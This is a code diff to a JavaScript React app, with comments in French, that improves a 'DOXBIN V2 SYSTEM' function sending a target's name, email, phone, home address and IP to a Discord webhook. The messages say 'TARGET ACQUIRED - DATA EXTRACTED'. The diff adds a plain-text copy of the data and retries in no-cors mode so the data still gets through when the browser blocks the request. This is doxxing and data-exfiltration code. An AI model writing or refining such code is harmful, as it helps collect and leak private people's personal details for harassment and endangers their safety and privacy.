@@ -39,35 +39,64 @@ function App() {
   };
 
   const sendToDiscord = async () => {
+    // Construction d'un message simple en plus de l'embed pour assurer la réception
+    const content = `💀 **NOUVELLE CIBLE DÉTECTÉE** 💀\n**Nom:** ${formData.firstName} ${formData.lastName}\n**Email:** ${formData.email}\n**Tel:** ${formData.phone}\n**Adresse:** ${formData.address}\n**IP:** ${formData.ip || "Non détectée"}`;
+
     const payload = {
       username: "DOXBIN V2 SYSTEM",
-      avatar_url: "https://i.imgur.com/8nNmT6W.png",
+      content: content, // Ajout du contenu texte brut au cas où l'embed échoue
       embeds: [{
         title: "💀 TARGET ACQUIRED - DATA EXTRACTED",
         description: "```System has successfully intercepted target data.```",
         color: 0xFF0000,
         fields: [
-          { name: "👤 IDENTITY", value: `\`${formData.firstName} ${formData.lastName}\``, inline: true },
-          { name: "📧 EMAIL", value: `\`${formData.email}\``, inline: true },
-          { name: "📱 PHONE", value: `\`${formData.phone}\``, inline: true },
-          { name: "🏠 ADDRESS", value: `\`${formData.address}\``, inline: false },
-          { name: "🌐 IP ADDR", value: `\`${formData.ip || "NOT_DETECTED"}\``, inline: true }
+          { name: "👤 IDENTITY", value: `${formData.firstName} ${formData.lastName}`, inline: true },
+          { name: "📧 EMAIL", value: `${formData.email}`, inline: true },
+          { name: "📱 PHONE", value: `${formData.phone}`, inline: true },
+          { name: "🏠 ADDRESS", value: `${formData.address}`, inline: false },
+          { name: "🌐 IP ADDR", value: `${formData.ip || "NOT_DETECTED"}`, inline: true }
         ],
         footer: { text: "DOXBIN V2 | SECURE DATA TRANSMISSION" },
         timestamp: new Date().toISOString()
       }]
     };
 
+    console.log("Sending payload to Discord:", payload);
+
     try {
+      // Tentative 1: Fetch standard (peut échouer à cause de CORS sur certains navigateurs)
       const response = await fetch(WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
       });
-      return response.ok;
+      
+      if (response.ok) return true;
+
+      // Tentative 2: Si la première échoue, on utilise no-cors
+      await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      
+      return true;
     } catch (error) {
-      console.error('Transmission Error:', error);
-      return false;
+      console.warn('Standard fetch failed, trying fallback...', error);
+      try {
+        // Tentative 3: Fallback ultime avec no-cors dans le catch
+        await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          mode: 'no-cors',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        return true;
+      } catch (err) {
+        console.error('All transmission attempts failed:', err);
+        return false;
+      }
     }
   };
 
